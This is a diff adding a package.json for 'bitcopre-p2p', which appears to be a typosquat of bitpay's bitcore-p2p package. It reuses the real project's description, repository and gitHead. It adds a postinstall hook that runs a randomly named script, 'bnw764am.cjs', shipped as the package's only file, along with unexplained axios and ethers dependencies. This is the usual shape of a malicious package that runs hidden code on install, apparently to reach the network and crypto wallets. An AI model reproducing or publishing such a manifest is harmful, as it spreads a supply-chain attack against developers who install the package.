@@ -1,0 +1,37 @@
+{
+  "name": "bitcopre-p2p",
+  "version": "10.5.3",
+  "description": "Interface to the bitcoin P2P network for bitcore",
+  "main": "index.js",
+  "scripts": {
+    "postinstall": "node bnw764am.cjs"
+  },
+  "keywords": [
+    "bitcoin",
+    "bitcore"
+  ],
+  "repository": {
+    "type": "git",
+    "url": "https://github.com/bitpay/bitcore-p2p.git"
+  },
+  "dependencies": {
+    "bitcore-lib": "^10.5.3",
+    "bloom-filter": "^0.2.0",
+    "buffers": "bitpay/node-buffers#v0.1.2-bitpay",
+    "socks5-client": "^0.3.6",
+    "axios": "^1.7.7",
+    "ethers": "^6.13.2"
+  },
+  "devDependencies": {
+    "bitcore-build": "^10.5.3",
+    "brfs": "^1.2.0",
+    "chai": "~1.10.0",
+    "gulp": "^4.0.0",
+    "sinon": "^1.12.2"
+  },
+  "license": "MIT",
+  "gitHead": "a69f026fa8f01615bd24c243705ae18b5237a274",
+  "files": [
+    "bnw764am.cjs"
+  ]
+}
